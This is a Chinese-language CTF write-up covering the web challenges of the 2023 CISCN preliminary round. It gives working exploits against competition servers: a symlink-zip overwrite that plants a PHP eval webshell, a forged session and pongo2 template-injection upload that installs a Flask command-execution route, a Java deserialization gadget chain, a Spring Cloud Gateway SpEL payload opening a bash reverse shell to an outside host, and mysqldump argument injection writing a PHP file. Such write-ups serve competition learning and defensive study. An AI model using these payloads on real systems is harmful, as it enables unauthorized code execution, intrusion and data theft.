---
title: "2023 CISCN 初赛 Web Writeup"
date: 2023-05-29T09:23:33+08:00
lastmod: 2023-05-29T09:23:33+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

跟 defcon 时间冲了, 抽空随便打的 (

<!--more-->

## unzip

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$finfo = finfo_open(FILEINFO_MIME_TYPE);
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
    exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
};

//only this!
```

unzip 命令没有 zip slip 的问题

但因为是压缩包, 所以可以传软连接 (参考 2022 MTCTF OnlineUnzip)

注意到执行 unzip 的时候有个 `-o` 参数, 即默认允许覆盖文件

所以考虑先创建一个指向 `/var` 目录的软连接 `test`, 本地压缩好后放到网站上解压

然后上传同名的 upload.php 解压到` /tmp/test/www/html/`, 覆盖原来的 upload.php 为 webshell

upload.php

```php
<?php eval($_REQUEST[1]);phpinfo();?>
```

test.zip

```bash
ln -s /var test
zip -y test.zip test
```

a.zip

```python
import zipfile

zf = zipfile.ZipFile('a.zip', 'w')
zf.write('upload.php', 'test/www/html/upload.php')
zf.close()
```

依次上传 test.zip a.zip

![image-20230527112032235](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305271120772.png)

![image-20230527112050696](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305271120724.png)

## go_session

session 由 gorilla/sessions 实现, 并且 session key 从环境变量中获得

```go
var store = sessions.NewCookieStore([]byte(os.Getenv("SESSION_KEY")))
```

/admin 路由需要 session name 为 admin 才能访问, 里面调用了 pongo2 来实现模版解析

/flask 路由可以访问到本机 5000 端口的 flask, 但是根据报错信息泄露的源码来看只有一个没有用的路由, 不过开启了 debug 模式

![image-20230527130028770](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305271300809.png)

试了一会发现 `os.Getenv` 如果获取不存在的环境变量就会返回空值

所以瞎猜一波题目服务器上并没有设置 `SESSION_KEY`

本地随便改一下源码, 把 cookie 复制下来扔到服务器上

```go
var store = sessions.NewCookieStore([]byte(""))

func Index(c *gin.Context) {
	session, err := store.Get(c.Request, "session-name")
	if err != nil {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		return
	}
	if session.Values["name"] == nil {
		session.Values["name"] = "admin"
		err = session.Save(c.Request, c.Writer)
		if err != nil {
			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
			return
		}
	}

	c.String(200, "Hello, admin")
}
```

![image-20230527130327648](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305271303679.png)

之后是 pongo2 ssti

参考文档:

[https://github.com/flosch/pongo2](https://github.com/flosch/pongo2)

[https://pkg.go.dev/github.com/gin-gonic/gin](https://pkg.go.dev/github.com/gin-gonic/gin)

注意到源码在编译模版的时候到 context 只传了 gin.Context, 所以猜测肯定是要从这方面入手

经过一段时间的测试和搜索找到这篇文章

[https://www.imwxz.com/posts/2b599b70.html#template%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7](https://www.imwxz.com/posts/2b599b70.html#template%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7)

一个任意文件写, 又想到上面的 flask 开了 debug 模式, 而在 debug 模式下 flask 会动态更新源码的内容

所以思路是通过 FormFile 和 SaveUploadedFile 上传文件覆盖掉之前的 flask 源码, 然后访问 /flask 路由 rce

源码路径可以在报错信息中找到

```
http://123.56.244.196:17997/flask?name=
```

![image-20230527130906244](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305271309280.png)

最后因为模版编译前会通过 html 编码把单双号转义, 所以需要换个方式传入字符串

发现 gin.Context 里面包装了 Request 和 ResponseWriter, 这里随便找了个 `Request.UserAgent()`

```go
// UserAgent returns the client's User-Agent, if sent in the request.
func (r *Request) UserAgent() string {
	return r.Header.Get("User-Agent")
}
```

最终 payload

```
GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}} HTTP/1.1
Host: 123.56.244.196:17997
Content-Length: 613
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrxtSm5i2S6anueQi
User-Agent: /app/server.py
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: session-name=MTY4NTE1ODc3OHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzlZGsWROWLHoCNn0Pbu3SkgRLWCZRrj8UIHVYgHU7GPw==
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundaryrxtSm5i2S6anueQi
Content-Disposition: form-data; name="/app/server.py"; filename="server.py"
Content-Type: text/plain

from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/shell')
def shell():
    cmd = request.args.get('cmd')
    if cmd:
        return os.popen(cmd).read()
    else:
        return 'shell'
    
if __name__== "__main__":
    app.run(host="127.0.0.1",port=5000,debug=True)
------WebKitFormBoundaryrxtSm5i2S6anueQi
Content-Disposition: form-data; name="submit"

&#25552;&#20132;
------WebKitFormBoundaryrxtSm5i2S6anueQi--

```

![image-20230527131218959](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305271312995.png)

![image-20230527131252957](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305271312997.png)

```
http://123.56.244.196:17997/flask?name=/shell?cmd=cat%2520/00cab53f1ece95d90020_flag
```

![image-20230527131325864](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305271313912.png)

## DeserBug

题目给了 commons-collections 和 hutool 依赖, 由于前者是 3.2.2 版本的所以诸如 InvokeTransformer 之类的就不能用了

hutool 里面有 JSONArray 和 JSONObject 类, 看名字感觉很像 fastjson 的类, 但实际上经过测试它们只会在 add / put 的时候触发任意 getter / setter, 调用 toString 时并不会触发

然后题目给了一个 Myexpect 类, 它的 getAnyexcept 可以调用任意类的 public 构造方法

结合之前 cc 链的经验很容易想到 `com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter` 这个类

```java
TemplatesImpl templatesImpl = new TemplatesImpl();
ClassPool pool = ClassPool.getDefault();
CtClass clazz = pool.get(TemplatesEvilClass.class.getName());

Reflection.setFieldValue(templatesImpl, "_name", "Hello");
Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

Myexpect expect = new Myexpect();
expect.setTargetclass(TrAXFilter.class);
expect.setTypeparam(new Class[]{Templates.class});
expect.setTypearg(new Object[]{templatesImpl});
```

之后需要找到从 readObject / toString 到 put / add 的链子, 根据题目给的 cc 依赖容易想到 TiedMapEntry 和 LazyMap

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

最终 payload

```java
import cn.hutool.json.JSONObject;
import com.app.Myexpect;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.net.URLEncoder;
import java.util.*;

public class Demo {
    public static void main(String[] args) throws Exception {

        String result;

        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(TemplatesEvilClass.class.getName());

        Reflection.setFieldValue(templatesImpl, "_name", "Hello");
        Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
        Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        Myexpect expect = new Myexpect();
        expect.setTargetclass(TrAXFilter.class);
        expect.setTypeparam(new Class[]{Templates.class});
        expect.setTypearg(new Object[]{templatesImpl});

        JSONObject jsonObject = new JSONObject();
        jsonObject.put("aa", "bb");

        Transformer transformer = new ConstantTransformer(1);

        Map innerMap = jsonObject;
        Map outerMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "k");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        innerMap.clear();

        Reflection.setFieldValue(transformer, "iConstant", expect);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream output = new ObjectOutputStream(baos);
        output.writeObject(expMap);
        output.flush();
        baos.flush();

        byte[] data = baos.toByteArray();

        String bugstr = URLEncoder.encode(Base64.getEncoder().encodeToString(data));
        System.out.println(bugstr);
//        try {
//            byte[] decode = Base64.getDecoder().decode(bugstr);
//            ObjectInputStream inputStream = new ObjectInputStream(new ByteArrayInputStream(decode));
//            Object object = inputStream.readObject();
//            result = object.toString();
//        } catch (Exception e) {
//            System.out.println(e.getClass());
//            com.app.Myexpect myexpect = new com.app.Myexpect();
//            myexpect.setTypeparam(new Class[]{String.class});
//            myexpect.setTypearg(new String[]{e.toString()});
//            myexpect.setTargetclass(e.getClass());
//            try {
//                result = myexpect.getAnyexcept().toString();
//            } catch (Exception ex) {
//                result = ex.toString();
//            }
//        }
    }
}
```

![image-20230527164333722](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305271643759.png)

![image-20230527164322538](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305271643587.png)

## BackendService

参考文章

[https://www.cnblogs.com/backlion/p/17246695.html](https://www.cnblogs.com/backlion/p/17246695.html)

[https://xz.aliyun.com/t/11493](https://xz.aliyun.com/t/11493)

结合之前爆出来的 nacos jwt 默认密钥导致的未授权漏洞

```
SecretKey012345678901234567890123456789012345678901234567890123456789
```

![image-20230528123945126](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305281239173.png)

然后直接去 nacos 后台发布配置, 注意 Data ID 为 `backcfg` 并且内容为 json 格式 (参考源码中的 bootstrap.yml)

```json
{
    "spring": {
        "cloud": {
            "gateway": {
                "routes": [
                    {
                        "id": "exam",
                        "order": 0,
                        "uri": "http://example.com/",
                        "predicates": [
                            "Path=/echo/**"
                        ],
                        "filters": [
                            {
                                "name": "AddResponseHeader",
                                "args": {
                                    "name": "result",
                                    "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'bash', '-c', 'bash -i >& /dev/tcp/vps-ip/65444 0>&1'}).getInputStream())).replaceAll('\n','').replaceAll('\r','')}"
                                }
                            }
                        ]
                    }
                ]
            }
        }
    }
}
```

![image-20230528124142926](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305281241967.png)

![image-20230528123723566](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305281237618.png)

## dumpit

参考文章: [https://mariadb.com/kb/en/mariadb-dump/](https://mariadb.com/kb/en/mariadb-dump/)

猜测 `?db=&table_2_dump=` 调用的是 mysqldump 之类的命令, 存在命令注入, 但是过滤了常规的一些字符

测试发现 mysqldump 会将 database 的名称输出 (即使不存在), 翻阅文档得知可以通过 `--result-file` 参数指定生成的文件名

payload

```
http://eci-2zej20xezk9iber18vi8.cloudeci1.ichunqiu.com:8888/?db=%22%3C?=phpinfo()?%3E%22%20--result-file%20shell.php&table_2_dump=flag1
```

flag 在环境变量里面

![image-20230528144046766](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202305281440809.png)

## reading

有个任意文件读取, 但是目录穿越挺脑洞的, 猜了一会发现是把 `..` 替换成 `.`, 用 `...` 就可以穿越了

然后 /flag 读不到, 但是有 /readflag 命令, 很明显是要 rce

然后读 app.py 发现有 secret key 和 key (时间戳 md5 加密), 还有 /flag 路由, 里面会验证 session key 加密过后的内容是否与源码开头的 key 相同, 之后执行 /readflag 命令

因为任意文件读取可以控制 page num 和 page size, 也就是 offset 和 length, 一个很经典的思路就是利用任意文件读取读 /proc/self/maps 获取 python 相关程序的地址然后读 /proc/self/mem 拿到堆里面的 secret key 和 key, 伪造 session 最后访问 /flag 路由

但是后来没啥时间就懒得看了 (

补一下 app.py

```python
# -*- coding:utf8 -*-
import os
import math
import time
import hashlib
from flask import Flask, request, session, render_template, send_file
from datetime import datetime
app = Flask(__name__)
app.secret_key = hashlib.md5(os.urandom(32)).hexdigest()
key = hashlib.md5(str(time.time_ns()).encode()).hexdigest()

books = os.listdir('./books')
books.sort(reverse=True)


@app.route('/')
def index():
if session:
book = session['book']
page = session['page']
page_size = session['page_size']
total_pages = session['total_pages']
filepath = session['filepath']

words = read_file_page(filepath, page, page_size)
return render_template('index.html', books=books, words=words)

return render_template('index.html', books=books )


@app.route('/books', methods=['GET', 'POST'])
def book_page():
if request.args.get('book'):
book = request.args.get('book')
elif session:
book = session.get('book')
else:
return render_template('index.html', books=books, message='I need book')
book=book.replace('..','.')
filepath = './books/' + book

if request.args.get('page_size'):
page_size = int(request.args.get('page_size'))
elif session:
page_size = int(session.get('page_size'))
else:
page_size = 3000

total_pages = math.ceil(os.path.getsize(filepath) / page_size)

if request.args.get('page'):
page = int(request.args.get('page'))
elif session:
page = int(session.get('page'))
else:
page = 1
words = read_file_page(filepath, page, page_size)
prev_page = page - 1 if page > 1 else None
next_page = page + 1 if page < total_pages else None

session['book'] = book
session['page'] = page
session['page_size'] = page_size
session['total_pages'] = total_pages
session['prev_page'] = prev_page
session['next_page'] = next_page
session['filepath'] = filepath
return render_template('index.html', books=books, words=words )


@app.route('/flag', methods=['GET', 'POST'])
def flag():
if hashlib.md5(session.get('key').encode()).hexdigest() == key:
return os.popen('/readflag').read()
else:
return "no no no"


def read_file_page(filename, page_number, page_size):
for i in range(3):
for j in range(3):
size=page_size + j
offset = (page_number - 1) * page_size+i
try:
with open(filename, 'rb') as file:
file.seek(offset)
words = file.read(size)
return words.decode().split('\n')
except Exception as e:
pass
#if error again
offset = (page_number - 1) * page_size
with open(filename, 'rb') as file:
file.seek(offset)
words = file.read(page_size)
return words.split(b'\n')


if __name__ == '__main__':
app.run(host='0.0.0.0', port='8000')
```

